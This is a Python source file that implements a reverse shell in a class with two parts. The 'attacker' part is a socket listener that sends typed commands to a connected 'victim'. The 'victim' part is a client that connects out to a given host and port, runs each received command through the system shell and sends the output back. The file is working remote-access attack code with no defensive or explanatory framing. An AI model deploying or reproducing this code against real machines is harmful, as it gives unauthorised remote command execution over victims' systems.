import socket
import sys
import subprocess
import os

class reverse_shell:
    def attacker(PORT):
        IP = "127.0.0.1"
        def send_commands(s, conn):
            print("victim terminal > ", end="")
            while True:
                try:
                    cmd = input()
                    if len(cmd) > 0:
                        conn.sendall(cmd.encode())
                        data = conn.recv(4096)
                        print(data.decode("utf-8"), end="")
                except KeyboardInterrupt:
                    print("\nServer killed")
                    conn.close()
                    sys.exit()
                except Exception as e:
                    print(e)
                    conn.close()
                    e.close()
                    sys.exit()

        def attack(address):
            try:
                s = socket.socket()
                s.bind(address)
                s.listen()
                print("Ready, waiting victim...")
            except Exception as e:
                print("\nSomething went wrong...")
                print(e)
                restart = input("\nDo you want to restart the server? y/n\n> ")
                if restart.lower() == "y" or restart.lower() == "yes":
                    print("Restarting server...")
                    attack(address)
                else:
                    print("\nAborted\n")
                    sys.exit()
            conn, client_addr = s.accept()
            print(f"victim connected | {client_addr}")
            send_commands(s, conn)
            
        attack((IP, PORT))

    
    
    def victim(IP, PORT):
        def receiver(s):
            while True:
                cmd_bytes = s.recv(4096)
                cmd = cmd_bytes.decode("utf-8")
                if cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    s.send(b"victim teminal > ")
                    continue
                if len(cmd) > 0:
                    p = subprocess.run(cmd, shell=True, capture_output=True)
                    data = p.stdout + p.stderr
                    s.sendall((data + b"victim terminal > "))

        def connect(address):
            try:
                s = socket.socket()
                s.connect(address)
                print("Connected")
            except socket.error as error:
                print("Error")
                sys.exit()
            receiver(s)
        
        connect((IP, PORT))
